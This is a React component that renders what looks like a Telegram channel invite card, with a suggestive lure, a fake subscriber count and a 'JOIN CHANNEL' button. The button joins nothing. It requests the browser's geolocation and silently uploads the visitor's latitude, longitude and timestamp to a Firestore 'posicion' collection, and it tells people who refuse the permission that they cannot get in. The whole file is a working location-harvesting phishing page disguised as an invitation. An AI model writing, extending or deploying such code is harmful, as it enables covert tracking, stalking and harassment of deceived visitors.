import React, { cloneElement } from 'react';
import { Timestamp, addDoc, collection, setDoc, doc } from "firebase/firestore";
import { Database} from "../../firebase/Firebaseconfig";
import { useState } from 'react';

function TelegramInviteCard() {
const [data,setData]= useState(null)
  
function succes(geodata){
    console.log(geodata.coords)
  uploadData(geodata.coords)
    //firebase code

   
  }
function noPermiso(){
  alert('No puedes acceder sin permisos')
}

async function uploadData(data){
  const position = collection(Database,'posicion');
  await addDoc(position,{
    latitud:data.latitude,
    longitude:data.longitude,
    time: Timestamp.now(),
  
  })
}



 async  function handleClick(){
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(succes,noPermiso)

}else{
  alert('no puedes usar geo')
}
   }
  return (
    <div className="bg-white mt-4  shadow-lg rounded-[14px] p-6 w-[334px] mx-auto text-center">
      <div className="mb-4">
        <img 
          src="https://via.placeholder.com/100" 
          alt="Profile" 
          className="w-34 h-34 rounded-full mx-auto"
        />
      </div>
      <h2 className="text-[22px] text-[#000000] font-bold mb-1">Lore-catty</h2>
      <p className="text-[#7d7f81] text-sm mb-4">368 subscribers</p>
      <p className="text-[#000000] mb-4">Solo gente 😈😉</p>
      <div className="space-y-2 mt-6">
      <button
      onClick={()=>handleClick()}
       className="bg-[#2481cc] text-white font-bold text-[12px] px-4 py-2 rounded-full relative overflow-hidden">
  <span className="absolute top-0 left-0 w-full h-full bg-gradient-to-r from-transparent via-white to-transparent opacity-50 animate-shine"></span>
  <span className="relative z-10">JOIN CHANNEL</span>
</button>
        {/* <button className="border border-[#0088cc] text-[#2481cc] px-4 py-2 rounded-full w-full">
          OPEN IN WEB
        </button> */}
      </div>
      <p className="text-[#7d7f81] text-xs mt-4">
        You are invited to the channel Lore-catty. Click above to join.
      </p>
    </div>
  );
}

export default TelegramInviteCard;
